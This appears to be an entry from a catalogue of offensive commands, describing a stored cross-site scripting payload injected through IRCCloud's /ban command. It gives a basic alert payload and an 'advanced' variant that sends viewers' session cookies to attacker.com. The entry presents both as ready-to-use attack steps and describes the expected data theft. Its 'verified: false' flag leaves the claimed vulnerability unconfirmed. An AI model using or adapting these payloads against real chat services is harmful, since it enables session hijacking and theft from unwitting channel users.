---
id: c3d4e5f6-g7h8-9012-cdef-345678901234
data: /ban <script>alert(2)</script>
tags:
  - xss
  - injection
type: command
output: >-
  Ban notice with embedded script rendered in channel messages, executing
  alert(2) in viewers' browsers
executor: irc
platforms:
  - Web
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T03:15:53.240Z'
verified: false
validated: true
submitted: true
---
# irc-ban-xss-payload

## Command

```irc
/ban <script>alert(2)</script>
```

## Description

This IRC command injects a persistent XSS payload via the /ban functionality in IRCCloud, where the ban target parameter is not properly sanitized, allowing HTML/JS execution in channel messages.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<script>alert(2)</script>` | Malicious payload disguised as ban mask; executes as JS on render | Yes |

## Examples

### Basic Usage

```irc
/ban <script>alert(2)</script>
```

### Advanced Usage

```irc
/ban *!*@<script>document.location='http://attacker.com?cookie='+document.cookie</script>
```

Use a more sophisticated payload for cookie exfiltration.

## Expected Output

The command logs a ban message in the channel containing the unescaped script tag. When any user views the channel, the script executes, showing an alert or performing the intended action like data theft.

## Related

- [[procedures/Inject-XSS-via-IRCCloud-ban-Command]]
